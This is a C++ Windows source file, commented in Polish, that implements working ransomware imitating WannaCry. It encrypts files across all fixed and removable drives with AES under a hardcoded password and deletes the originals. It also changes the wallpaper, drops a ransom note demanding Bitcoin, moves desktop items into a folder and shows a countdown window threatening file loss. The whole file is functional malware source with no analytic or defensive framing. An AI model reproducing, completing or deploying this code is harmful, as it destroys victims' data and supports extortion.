#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <stdexcept>
#include <ctime>
#include <cmath> // <--- FIX 1: Dodano brakuj¹cy nag³ówek dla funkcji fmod

// Nag³ówki systemowe Windows
#include <windows.h>
#include <wincrypt.h>
#include <tchar.h>
#include <shlobj.h> // Potrzebne dla SHGetSpecialFolderPathW

// Do³¹czone biblioteki
#define AES256 1
#include "aes.h"
#include "sha-256.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Shell32.lib") // Potrzebne dla SHGetSpecialFolderPathW

// --- DEFINICJE IDENTYFIKATORÓW KONTROLEK I ZASOBÓW ---
#define IDC_TIMER_DEADLINE1 1001
#define IDC_TIMER_DEADLINE2 1002
#define IDC_BTN_PAYMENT     1003
#define IDC_BTN_DECRYPT     1004
#define IDC_BTN_CONTACT     1005
#define IDT_REFRESH_TIMER   1006

// --- ZMIENNE GLOBALNE/STATYCZNE DLA OKNA G£ÓWNEGO ---
static HBRUSH hRedBrush;
static HBRUSH hBlackBrush;
static time_t time_payment_raised;
static time_t time_files_lost;

// --- PROTOTYPY FUNKCJI ---
void ExecutePayload(const std::string& password, bool encryptMode);
bool AskForPassword_Simple(HINSTANCE hInstance, HWND hParent, const wchar_t* correctPassword);
std::wstring string_to_wstring(const std::string& str);
LRESULT CALLBACK WannaCryWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

// Struktura do przekazywania danych do procedury okna WannaCry
struct AppData {
    HINSTANCE hInstance;
    const std::string* masterPassword;
};

// --- SEKCJA POMOCNICZA (Z OBS£UG¥ PLIKU-ZNACZNIKA) ---

std::wstring GetMarkerFilePath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
        return std::wstring(path) + L"\\kerem_marker.dat";
    }
    return L"C:\\kerem_marker.dat";
}

bool IsEncryptionMarkerPresent() {
    DWORD dwAttrib = GetFileAttributesW(GetMarkerFilePath().c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void CreateEncryptionMarker() {
    HANDLE hFile = CreateFileW(GetMarkerFilePath().c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
    }
}

void RemoveEncryptionMarker() {
    DeleteFileW(GetMarkerFilePath().c_str());
}

// --- SEKCJA GRAFICZNA ---
void GenerateWallpaperAndNote(const std::wstring& wallpaperPath, const std::wstring& notePath) {
    const int width = 1920, height = 1080; HDC hdcScreen = GetDC(NULL); HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height); SelectObject(hdcMem, hBitmap);
    HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0)); RECT rect = {0, 0, width, height}; FillRect(hdcMem, &rect, hBrush);
    DeleteObject(hBrush); SetTextColor(hdcMem, RGB(255, 0, 0)); SetBkMode(hdcMem, TRANSPARENT);
    HFONT hFont = CreateFontW(100, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
    SelectObject(hdcMem, hFont); DrawTextW(hdcMem, L"YOUR FILES ARE ENCRYPTED", -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    BITMAP bmp; GetObject(hBitmap, sizeof(BITMAP), &bmp); BITMAPFILEHEADER bmfHeader = {0}; BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER); bi.biWidth = bmp.bmWidth; bi.biHeight = bmp.bmHeight; bi.biPlanes = 1; bi.biBitCount = 24; bi.biCompression = BI_RGB;
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight; std::vector<BYTE> bmpData(dwBmpSize);
    GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, bmpData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    std::ofstream file(wallpaperPath.c_str(), std::ios::binary);
    bmfHeader.bfType = 0x4D42; bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER); bmfHeader.bfSize = bmfHeader.bfOffBits + dwBmpSize;
    file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER)); file.write((char*)&bi, sizeof(BITMAPINFOHEADER)); file.write((char*)bmpData.data(), dwBmpSize);
    file.close(); DeleteObject(hBitmap); DeleteObject(hFont); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    std::wofstream notka(notePath.c_str());
    notka << L"All your important files have been encrypted...\nTo decrypt them, you need to pay. Contact us: not.a.scammer@example.com";
    notka.close();
}

void MoveDesktopItems(const wchar_t* folderName) {
    // <--- FIX 2: U¿yto poprawnej funkcji SHGetSpecialFolderPathW
    wchar_t desktopPath[MAX_PATH]; if (SUCCEEDED(SHGetSpecialFolderPathW(NULL, desktopPath, CSIDL_DESKTOP, FALSE))) {
        wchar_t newFolderPath[MAX_PATH]; swprintf_s(newFolderPath, L"%s\\%s", desktopPath, folderName);
        CreateDirectoryW(newFolderPath, NULL);
        wchar_t searchPath[MAX_PATH]; swprintf_s(searchPath, L"%s\\*.*", desktopPath);
        WIN32_FIND_DATAW findData; HANDLE hFind = FindFirstFileW(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0 || wcscmp(findData.cFileName, folderName) == 0) continue;
                if (wcscmp(findData.cFileName, L"READ_ME.txt") == 0 || wcscmp(findData.cFileName, L"ransom_wallpaper.bmp") == 0) continue;
                wchar_t srcPath[MAX_PATH]; swprintf_s(srcPath, L"%s\\%s", desktopPath, findData.cFileName);
                wchar_t destPath[MAX_PATH]; swprintf_s(destPath, L"%s\\%s", newFolderPath, findData.cFileName);
                MoveFileW(srcPath, destPath);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
}

// --- G£ÓWNA PROCEDURA OKNA RANSOMWARE ---
LRESULT CALLBACK WannaCryWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    AppData* pData = (AppData*)GetWindowLongPtr(hwnd, GWLP_USERDATA);

    switch (msg) {
        case WM_CREATE: {
            CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
            pData = (AppData*)pCreate->lpCreateParams;
            SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pData);
            
            hRedBrush = CreateSolidBrush(RGB(139, 0, 0));
            time_t now = time(NULL); time_payment_raised = now + (3 * 24 * 60 * 60); time_files_lost = now + (7 * 24 * 60 * 60);
            
            HFONT hFontTitle = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
            HFONT hFontNormal = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");

            HWND hStaticTitle = CreateWindowW(L"STATIC", L"Ooops, your files have been encrypted!", WS_VISIBLE | WS_CHILD | SS_CENTER, 20, 20, 540, 30, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

            CreateWindowW(L"STATIC", L"Payment will be raised on:", WS_VISIBLE | WS_CHILD, 30, 80, 200, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"STATIC", L"", WS_VISIBLE | WS_CHILD, 30, 100, 250, 20, hwnd, (HMENU)IDC_TIMER_DEADLINE1, NULL, NULL);
            CreateWindowW(L"STATIC", L"Your files will be lost on:", WS_VISIBLE | WS_CHILD, 350, 80, 200, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"STATIC", L"", WS_VISIBLE | WS_CHILD, 350, 100, 250, 20, hwnd, (HMENU)IDC_TIMER_DEADLINE2, NULL, NULL);

            HWND hStaticInfo = CreateWindowW(L"STATIC", L"What Happened to My Computer?\nYour important files are encrypted.\n\n" L"Can I Recover My Files?\nSure. We guarantee that you can recover all your files safely and easily.", WS_VISIBLE | WS_CHILD, 30, 150, 280, 200, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticInfo, WM_SETFONT, (WPARAM)hFontNormal, TRUE);
            
            CreateWindowW(L"BUTTON", L"Check Payment", WS_VISIBLE | WS_CHILD, 350, 180, 180, 40, hwnd, (HMENU)IDC_BTN_PAYMENT, NULL, NULL);
            CreateWindowW(L"BUTTON", L"Decrypt", WS_VISIBLE | WS_CHILD, 350, 230, 180, 40, hwnd, (HMENU)IDC_BTN_DECRYPT, NULL, NULL);
            CreateWindowW(L"BUTTON", L"Contact Us", WS_VISIBLE | WS_CHILD, 350, 280, 180, 40, hwnd, (HMENU)IDC_BTN_CONTACT, NULL, NULL);
            
            SetTimer(hwnd, IDT_REFRESH_TIMER, 1000, NULL); SendMessage(hwnd, WM_TIMER, IDT_REFRESH_TIMER, 0);
            break;
        }
        case WM_TIMER: {
            if (wParam == IDT_REFRESH_TIMER) {
                wchar_t buffer[100]; time_t now = time(NULL);
                double diff_payment = difftime(time_payment_raised, now);
                if (diff_payment > 0) { swprintf_s(buffer, L"Time Left: %02d:%02d:%02d:%02d", (int)(diff_payment / 86400), (int)(fmod(diff_payment, 86400) / 3600), (int)(fmod(diff_payment, 3600) / 60), (int)fmod(diff_payment, 60)); }
                else { wcscpy_s(buffer, L"Time has expired!"); } SetDlgItemTextW(hwnd, IDC_TIMER_DEADLINE1, buffer);
                double diff_lost = difftime(time_files_lost, now);
                if (diff_lost > 0) { swprintf_s(buffer, L"Time Left: %02d:%02d:%02d:%02d", (int)(diff_lost / 86400), (int)(fmod(diff_lost, 86400) / 3600), (int)(fmod(diff_lost, 3600) / 60), (int)fmod(diff_lost, 60)); }
                else { wcscpy_s(buffer, L"Files may be lost forever!"); } SetDlgItemTextW(hwnd, IDC_TIMER_DEADLINE2, buffer);
            } break;
        }
        case WM_CTLCOLORSTATIC: { HDC hdcStatic = (HDC)wParam; SetTextColor(hdcStatic, RGB(255, 255, 255)); SetBkMode(hdcStatic, TRANSPARENT); return (INT_PTR)hRedBrush; }
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case IDC_BTN_PAYMENT: MessageBoxW(hwnd, L"Payment is accepted in Bitcoin only.", L"Payment Info", MB_OK); break;
                case IDC_BTN_DECRYPT: {
                    if (pData) {
                        std::wstring masterPasswordW = string_to_wstring(*pData->masterPassword);
                        if (AskForPassword_Simple(pData->hInstance, hwnd, masterPasswordW.c_str())) {
                            MessageBoxW(hwnd, L"Password correct! Decryption will start. This may take a while.", L"Success", MB_OK | MB_ICONINFORMATION);
                            ExecutePayload(*pData->masterPassword, false);
                            RemoveEncryptionMarker(); 
                            MessageBoxW(hwnd, L"Decryption finished! You can now close this window.", L"Done", MB_OK | MB_ICONINFORMATION);
                            DestroyWindow(hwnd);
                        }
                    }
                    break;
                }
                case IDC_BTN_CONTACT: MessageBoxW(hwnd, L"Contact: not.a.scammer@example.com", L"Contact Us", MB_OK); break;
            } break;
        }
        case WM_DESTROY: { KillTimer(hwnd, IDT_REFRESH_TIMER); DeleteObject(hRedBrush); PostQuitMessage(0); break; }
        default: return DefWindowProc(hwnd, msg, wParam, lParam);
    } return 0;
}

// --- FUNKCJE POMOCNICZE ---

std::wstring string_to_wstring(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
    return wstr;
}
void generate_key_from_password(const std::string& password, uint8_t* key) {
    sha256_context ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, (uint8_t*)password.c_str(), password.length());
    sha256_final(&ctx, key);
}
bool generate_random_iv(uint8_t* iv) {
    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptGenRandom(hCryptProv, 16, iv)) { CryptReleaseContext(hCryptProv, 0); return false; }
    CryptReleaseContext(hCryptProv, 0); return true;
}

// --- FUNKCJE SZYFRUJ¥CE/DESZYFRUJ¥CE ---

void EncryptFile(const std::wstring& filePath, const std::string& password) {
    std::wstring outFilePath = filePath + L".wannakerem";
    HANDLE hInFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInFile == INVALID_HANDLE_VALUE) return;
    HANDLE hOutFile = CreateFileW(outFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) { CloseHandle(hInFile); return; }
    uint8_t key[32]; uint8_t iv[16];
    generate_key_from_password(password, key);
    if (!generate_random_iv(iv)) { CloseHandle(hInFile); CloseHandle(hOutFile); return; }
    DWORD bytesWritten; WriteFile(hOutFile, iv, 16, &bytesWritten, NULL);
    struct AES_ctx ctx; AES_init_ctx_iv(&ctx, key, iv);
    const int BUFFER_SIZE = 4096; std::vector<uint8_t> buffer(BUFFER_SIZE); DWORD bytesRead;
    while (ReadFile(hInFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        size_t paddedSize = bytesRead;
        if (bytesRead < BUFFER_SIZE) {
            uint8_t padding_value = 16 - (bytesRead % 16);
            paddedSize = bytesRead + padding_value;
            if (paddedSize > buffer.size()) buffer.resize(paddedSize);
            for(size_t i = bytesRead; i < paddedSize; ++i) buffer[i] = padding_value;
        }
        AES_CBC_encrypt_buffer(&ctx, buffer.data(), paddedSize);
        WriteFile(hOutFile, buffer.data(), paddedSize, &bytesWritten, NULL);
    }
    CloseHandle(hInFile); CloseHandle(hOutFile); DeleteFileW(filePath.c_str());
}

void DecryptFile(const std::wstring& filePath, const std::string& password) {
    if (filePath.size() <= 11 || filePath.substr(filePath.size() - 11) != L".wannakerem") return;
    std::wstring outFilePath = filePath.substr(0, filePath.size() - 11);
    HANDLE hInFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInFile == INVALID_HANDLE_VALUE) return;
    HANDLE hOutFile = CreateFileW(outFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) { CloseHandle(hInFile); return; }
    uint8_t key[32]; generate_key_from_password(password, key);
    uint8_t iv[16]; DWORD bytesRead;
    ReadFile(hInFile, iv, 16, &bytesRead, NULL);
    if (bytesRead != 16) { CloseHandle(hInFile); CloseHandle(hOutFile); DeleteFileW(outFilePath.c_str()); return; }
    struct AES_ctx ctx; AES_init_ctx_iv(&ctx, key, iv);
    const int BUFFER_SIZE = 4096; std::vector<uint8_t> current_buffer(BUFFER_SIZE);
    std::vector<uint8_t> prev_buffer; DWORD prev_bytesRead = 0;
    while (ReadFile(hInFile, current_buffer.data(), BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        AES_CBC_decrypt_buffer(&ctx, current_buffer.data(), bytesRead);
        if (!prev_buffer.empty()) {
            DWORD bytesWritten; WriteFile(hOutFile, prev_buffer.data(), prev_bytesRead, &bytesWritten, NULL);
        }
        prev_buffer.assign(current_buffer.begin(), current_buffer.begin() + bytesRead);
        prev_bytesRead = bytesRead;
    }
    if (!prev_buffer.empty()) {
        size_t dataSize = prev_bytesRead;
        uint8_t padding_value = prev_buffer[dataSize - 1];
        if (padding_value > 0 && padding_value <= 16) {
            bool padding_is_valid = true;
            if (dataSize < padding_value) { padding_is_valid = false; }
            else {
                for (size_t i = dataSize - padding_value; i < dataSize; ++i) {
                    if (prev_buffer[i] != padding_value) { padding_is_valid = false; break; }
                }
            }
            if (padding_is_valid) { dataSize -= padding_value; }
        }
        if (dataSize > 0) { DWORD bytesWritten; WriteFile(hOutFile, prev_buffer.data(), dataSize, &bytesWritten, NULL); }
    }
    CloseHandle(hInFile); CloseHandle(hOutFile); DeleteFileW(filePath.c_str());
}


// --- LOGIKA PRZESZUKIWANIA I PAYLOADU ---

void TraverseAndProcessFiles(const std::wstring& directoryPath, const std::string& password, bool encryptMode) {
    std::wstring searchPath = directoryPath + L"\\*";
    WIN32_FIND_DATAW findData; HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        std::wstring name = findData.cFileName; if (name == L"." || name == L"..") continue;
        if (name == L"Windows" || name.find(L"Program Files") != std::wstring::npos || name.find(L"ProgramData") != std::wstring::npos || name.find(L"$Recycle.Bin") != std::wstring::npos) continue;
        std::wstring fullPath = directoryPath + L"\\" + name;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { TraverseAndProcessFiles(fullPath, password, encryptMode); }
        else {
            if (encryptMode) {
                if (fullPath.find(L"szyfrator.exe") == std::wstring::npos && fullPath.find(L".dll") == std::wstring::npos && fullPath.find(L"ransom_wallpaper.bmp") == std::wstring::npos && fullPath.find(L"READ_ME.txt") == std::wstring::npos) {
                     EncryptFile(fullPath, password);
                }
            } else { if (fullPath.size() > 11 && fullPath.substr(fullPath.size() - 11) == L".wannakerem") {
                    DecryptFile(fullPath, password);
            } }
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
}

void ExecutePayload(const std::string& password, bool encryptMode) {
    wchar_t drives[MAX_PATH];
    if (GetLogicalDriveStringsW(MAX_PATH, drives)) {
        wchar_t* drive = drives;
        while (*drive) {
            UINT driveType = GetDriveTypeW(drive);
            if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
                TraverseAndProcessFiles(std::wstring(drive), password, encryptMode);
            }
            drive += wcslen(drive) + 1;
        }
    }
}

// --- OKNO HAS£A ---
struct SimplePasswordData { const wchar_t* correctPassword; bool* pResult; };

LRESULT CALLBACK PasswordDialogProc_Simple(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    SimplePasswordData* pData = (SimplePasswordData*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    switch (msg) {
        case WM_CREATE: {
            CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam; pData = (SimplePasswordData*)pCreate->lpCreateParams;
            SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pData);
            CreateWindowW(L"STATIC", L"Enter Password:", WS_VISIBLE | WS_CHILD, 10, 10, 120, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 10, 35, 260, 20, hwnd, (HMENU)101, NULL, NULL);
            CreateWindowW(L"BUTTON", L"OK", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 70, 70, 80, 25, hwnd, (HMENU)IDOK, NULL, NULL);
            CreateWindowW(L"BUTTON", L"Cancel", WS_VISIBLE | WS_CHILD, 160, 70, 80, 25, hwnd, (HMENU)IDCANCEL, NULL, NULL);
            return 0;
        }
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case IDOK: {
                    wchar_t enteredPassword[256]; GetDlgItemTextW(hwnd, 101, enteredPassword, 256);
                    if (wcscmp(enteredPassword, pData->correctPassword) == 0) { *pData->pResult = true; }
                    else { *pData->pResult = false; MessageBoxW(hwnd, L"Invalid password.", L"Error", MB_OK | MB_ICONERROR); }
                    DestroyWindow(hwnd); return 0;
                }
                case IDCANCEL: { *pData->pResult = false; DestroyWindow(hwnd); return 0; }
            } break;
        }
        case WM_CLOSE: { *pData->pResult = false; DestroyWindow(hwnd); return 0; }
        case WM_DESTROY: { PostQuitMessage(0); return 0; }
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

bool AskForPassword_Simple(HINSTANCE hInstance, HWND hParent, const wchar_t* correctPassword) {
    const wchar_t CLASS_NAME[] = L"SimplePasswordDialogClass"; 
    WNDCLASSW wc = {};
    if (!GetClassInfoW(hInstance, CLASS_NAME, &wc)) {
        wc.lpfnWndProc = PasswordDialogProc_Simple;
        wc.hInstance = hInstance;
        wc.lpszClassName = CLASS_NAME;
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        RegisterClassW(&wc);
    }
    
    bool result = false; SimplePasswordData data = { correctPassword, &result };
    HWND hwnd = CreateWindowW(CLASS_NAME, L"Authentication", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                              CW_USEDEFAULT, CW_USEDEFAULT, 300, 150, hParent, NULL, hInstance, &data);
    if (!hwnd) return false;
    EnableWindow(hParent, FALSE); ShowWindow(hwnd, SW_SHOW); UpdateWindow(hwnd);
    MSG msg = {}; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    EnableWindow(hParent, TRUE); if(hParent) SetForegroundWindow(hParent);
    return result;
}

// --- G£ÓWNY PUNKT WEJŒCIA PROGRAMU ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    const std::string masterPassword = "kerem";
    
    if (!IsEncryptionMarkerPresent()) {
        ExecutePayload(masterPassword, true);

        wchar_t desktopPath[MAX_PATH];
        if (SUCCEEDED(SHGetSpecialFolderPathW(NULL, desktopPath, CSIDL_DESKTOP, FALSE))) {
            std::wstring wallpaperPath = std::wstring(desktopPath) + L"\\ransom_wallpaper.bmp";
            std::wstring readmePath = std::wstring(desktopPath) + L"\\READ_ME.txt";
            GenerateWallpaperAndNote(wallpaperPath, readmePath);
            MoveDesktopItems(L"My_Encrypted_Files");
        }
        
        CreateEncryptionMarker();
    }
    
    const TCHAR CLASS_NAME[] = _T("WannaCryWindowClass"); 
    WNDCLASS wc = {};
    
    if (!GetClassInfo(hInstance, CLASS_NAME, &wc)) {
        wc.lpfnWndProc = WannaCryWndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = CLASS_NAME;
        hBlackBrush = CreateSolidBrush(RGB(0, 0, 0)); 
        wc.hbrBackground = hBlackBrush;
        wc.hIcon = LoadIcon(NULL, IDI_WARNING);
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        RegisterClass(&wc);
    }

    AppData appData = { hInstance, &masterPassword };

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, _T("Wana Decrypt0r 2.0"), WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                               CW_USEDEFAULT, CW_USEDEFAULT, 600, 400, NULL, NULL, hInstance, &appData);
    if (!hwnd) {
        if(hBlackBrush) DeleteObject(hBlackBrush);
        return 1;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hBlackBrush) {
        DeleteObject(hBlackBrush);
    }

    return (int)msg.wParam; 
}
